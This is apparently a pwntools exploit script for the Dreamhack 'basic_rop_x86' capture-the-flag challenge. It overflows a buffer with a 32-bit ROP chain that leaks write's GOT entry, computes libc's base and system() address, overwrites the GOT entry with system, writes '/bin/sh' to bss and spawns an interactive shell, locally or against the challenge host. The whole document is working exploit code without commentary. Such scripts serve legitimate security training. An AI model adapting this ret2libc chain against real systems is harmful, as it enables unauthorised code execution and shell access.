from pwn import *
import sys

context.log_level="debug"

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',17221)
elif sys.argv[1]=="-l":
    p = process('basic_rop_x86')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('./basic_rop_x86')
libc=ELF('./libc.so.6')

# GADGETS
pop3ret=0x8048689
ret=0x80483c2

# PLT ADDRESS
read_plt=e.plt['read']
write_plt=e.plt['write']

# GOT ADDRESS
read_got=e.got['read']
write_got=e.got['write']

# OFFSETS
write_offset=libc.symbols['write']
system_offset=libc.symbols['system']

# ETC ADDRESS
bss=e.bss()
binsh="/bin/sh\x00"

def ROP_CHAIN(function,*args):
    if len(args)==3:
        payload=""
        payload+=p32(function)
        payload+=p32(pop3ret)
        for i in range(len(args)):
            payload+=p32(args[i])
    else:
        log.info("ROP_CHAIN needs 3 parameters!")
        exit(0)

    return payload
    
log.info("read_plt address: {}".format(hex(read_plt)))
log.info("write_plt address: {}".format(hex(write_plt)))
log.info("read_got address: {}".format(hex(read_got)))
log.info("write_got address: {}".format(hex(write_got)))




payload="A"*0x40
payload+="B"*0x4
payload+=p32(ret)
payload+=ROP_CHAIN(write_plt,1,write_got,4)
payload+=ROP_CHAIN(read_plt,0,bss,8)
payload+=ROP_CHAIN(read_plt,0,write_got,4)
payload+=ROP_CHAIN(write_plt,bss,0,0)

p.send(payload)

log.info(p.recv())
write_address=u32(p.recv())
libc_base=write_address-write_offset
system_address=libc_base+system_offset
log.info("write_address: {}".format(hex(write_address)))
log.info("system_address: {}".format(hex(system_address)))
log.info("libc_base: {}".format(hex(libc_base)))

p.send(binsh)
p.send(p32(system_address))

p.interactive()